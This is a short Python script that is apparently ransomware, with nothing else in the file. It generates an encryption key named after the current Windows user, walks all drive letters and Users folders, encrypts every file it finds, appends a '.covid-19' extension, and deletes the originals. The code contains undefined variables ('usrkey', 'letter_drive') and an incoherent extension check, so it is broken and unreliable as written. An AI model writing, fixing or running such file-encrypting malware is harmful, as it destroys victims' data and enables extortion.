#!/usr/bin/python
#coding:utf-8
from cryptography.fernet import Fernet
from random import random, randint
import os

current_user = os.environ["USERNAME"]
userkey = "{}.key".format(current_user)

all_drives ="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
drives = []

def random_id():
	for id in range(100):
		id = randint(1, 100)
		with open("id", "w") as num:
			num.write(str(id))
		break
		
def genkey(name):
    global key
    key = Fernet.generate_key()
    with open(usrkey, "wb") as file:
        file.write(key)
        
def file_encrypt(key, name):
    with open(name,'rb') as files:
        data = files.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)
    encrypted_file = name + ".covid-19"
    try:
        with open(encrypted_file, 'wb') as files:
            files.write(encrypted)

        os.remove(name)
    except:
        pass

def drives_aux():
    for letter in all_drives:
        if os.path.isdir(letter + ':\\'):
            drives.append(letter + ":")
    for drive in drives:
        rep = ["{}\\Users\\".format(drive)]
        if drive != letter_drive:
            rep.append(drive + "\\")
            for letter in rep:
                for root, dir, files in os.walk(letter):
                    for file in files:
                        for ext in file.split("."):
                            if file.endswith(ext):
                                my_ext = ["hacked"]
                                if not(ext in my_ext):
                                    try:
                                        full_path = os.path.join(root, file)
                                        file_encrypt(key, full_path)
                                    except:
                                        pass